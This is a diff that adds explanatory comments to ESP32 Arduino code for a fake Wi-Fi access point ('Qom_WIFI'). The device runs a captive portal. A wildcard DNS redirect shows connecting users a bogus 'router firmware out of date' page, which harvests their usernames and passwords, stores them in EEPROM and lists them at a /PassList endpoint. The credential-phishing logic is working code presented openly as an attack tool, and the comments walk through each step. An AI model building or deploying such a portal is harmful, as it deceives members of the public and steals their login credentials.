@@ -2,12 +2,12 @@
 #include <WiFi.h>
 #include <DNSServer.h> 
 #include <WebServer.h>
-#include <EEPROM.h>
+#include <EEPROM.h> //حافظه
 #define LED_BUILTIN 2
 
-const char* SSID_NAME = "om_WIFI";
+const char* SSID_NAME = "Qom_WIFI";
 
-#define SUBTITLE "Confidential"
+#define SUBTITLE "Confidential" //DINT REAPAT IT
 #define TITLE "Update"
 #define BODY "Your router firmware is out of date. Update your firmware to continue browsing normally."
 #define POST_TITLE "Updating..."
@@ -17,7 +17,7 @@ const char* SSID_NAME = "om_WIFI";
 
 const byte DNS_PORT = 53;
 const byte TICK_TIMER = 1000;
-IPAddress APIP(172, 0, 0, 1);
+IPAddress APIP(172, 0, 0, 1); //AP
 
 String allUsername = "";
 String allPass = "";
@@ -25,7 +25,7 @@ String Username_Pass = "";
 String newSSID = "";
 String currentSSID = "";
 
-int initialCheckLocation = 20; 
+int initialCheckLocation = 20;  // START IN EEROM
 int passStart = 30;
 int passEnd = passStart;
 
@@ -34,8 +34,8 @@ DNSServer dnsServer; WebServer webServer(80);
 
 String input(String argName) {
   String a = webServer.arg(argName);
-  a.replace("<","&lt;");a.replace(">","&gt;");
-  a.substring(0,200); return a; }
+  a.replace("<","&lt;");a.replace(">","&gt;"); //XSS
+  a.substring(0,200); return a; } //MAX LENGTH FOR INPUTE
 
 String footer() { 
   return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
@@ -184,7 +184,7 @@ String index() {
                     "</html>";
   return htmlCode;
 }
-String allUsersAndPasswords() {
+String allUsersAndPasswords() { // LIST OF USERNAME AND PASSWORD
   String result = "<ol>";
   
   result += Username_Pass;
@@ -195,12 +195,12 @@ String allUsersAndPasswords() {
 }
 
 String postedUsernamePassword() {
-  String username = input("username_user");
-  String password = input("password_user");
-  String data = "<li><b>Username: " + username + " | Password: " + password + "</b></li>";
-  Username_Pass += data;
+  String username = input("username_user"); //GET USERNAME
+  String password = input("password_user"); //GET PASS
+  String data = "<li><b>Username: " + username + " | Password: " + password + "</b></li>"; // CREATE STRING OF DATA
+  Username_Pass += data;// ADD IN USERNA,E PASS
 
-  String htmlContent = "<!DOCTYPE html>\n"
+  String htmlContent = "<!DOCTYPE html>\n" // SHOW FAKE UPDATING PAGE
                        "<html lang=\"en\">\n"
                        "<head>\n"
                        "  <meta charset=\"UTF-8\">\n"
@@ -275,18 +275,18 @@ String postedUsernamePassword() {
 }
 
 String clear() {
-  Username_Pass = "";
-  passEnd = passStart;
-  EEPROM.write(passEnd, '\0');
+  Username_Pass = ""; //FREE
+  passEnd = passStart; //NESHANGAR
+  EEPROM.write(passEnd, '\0'); //REWRITE
   EEPROM.commit();
-  return header(CLEAR_TITLE) + "<div><p>The username and password lists have been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
+  return header(CLEAR_TITLE) + "<div><p>The username and password lists have been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer(); // SHOW CLEAR PAGE
 }
 
 
 void BLINK() {
   for (int counter = 0; counter < 10; counter++)
   {
-    digitalWrite(LED_BUILTIN, counter % 2);
+    digitalWrite(LED_BUILTIN, counter % 2); // ON AND OFF LED TO SHOW CONNECTING
     delay(500);
   }
 }
@@ -296,10 +296,10 @@ void setup() {
   Serial.begin(115200);
   
   bootTime = lastActivity = millis();
-  EEPROM.begin(512);
+  EEPROM.begin(512); //EEPROM SIZE
   delay(10);
 
-  String checkValue = "first";
+  String checkValue = "first";  // START EEPROM WITH FIRST IF NOT THEN WRITE
 
   for (int i = 0; i < checkValue.length(); ++i)
   {
@@ -318,18 +318,18 @@ void setup() {
   
   String ESSID;
   int i = 0;
-  while (EEPROM.read(i) != '\0') {
+  while (EEPROM.read(i) != '\0') { // READ SSID
     ESSID += char(EEPROM.read(i));
     i++;
   }
 
-  while (EEPROM.read(passEnd) != '\0')
+  while (EEPROM.read(passEnd) != '\0')  // READ PASSWORD
   {
     allPass += char(EEPROM.read(passEnd));
     passEnd++;
   }
   
-  WiFi.mode(WIFI_AP);
+  WiFi.mode(WIFI_AP); //SELECT AP MODE FOR ESP32
   WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
 
   currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;
@@ -338,7 +338,7 @@ void setup() {
   Serial.print(currentSSID);
   WiFi.softAP(currentSSID);  
 
-  dnsServer.start(DNS_PORT, "*", APIP);
+  dnsServer.start(DNS_PORT, "*", APIP); // START DNS IN PORT 53 CAPTIVE PORTAL TO DIRECT USER IN FAKE PAGE
   webServer.on("/login", HTTP_POST, []() { webServer.send(200, "text/html", postedUsernamePassword()); BLINK(); });
   webServer.on("/PassList", HTTP_GET, []() { webServer.send(200, "text/html", allUsersAndPasswords()); });
   webServer.on("/clear", HTTP_GET, []() { webServer.send(200, "text/html", clear()); });
@@ -350,6 +350,6 @@ void setup() {
 }
 
 
-void loop() { 
+void loop() {   // LOOP FOR UPDATE 1S
   if ((millis() - lastTick) > TICK_TIMER) {lastTick = millis();} 
 dnsServer.processNextRequest(); webServer.handleClient(); }
